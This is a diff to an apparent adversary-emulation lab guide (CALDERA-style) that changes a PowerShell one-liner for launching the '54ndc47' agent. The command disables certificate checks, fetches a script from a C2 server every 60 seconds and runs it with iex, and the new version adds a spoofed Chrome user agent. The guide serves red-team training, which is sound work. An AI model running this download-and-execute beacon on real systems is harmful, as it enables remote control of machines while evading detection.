@@ -154,7 +154,7 @@ Perform the same steps as mission #1 - with the exception of:
 
 1. Start a PowerShell version of 54ndc47, instead of a bash version.
 ```
-while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
+while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$web.Headers.add("user-agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
 ```
 
 2. Run the mission2 adversary, instead of mission1.
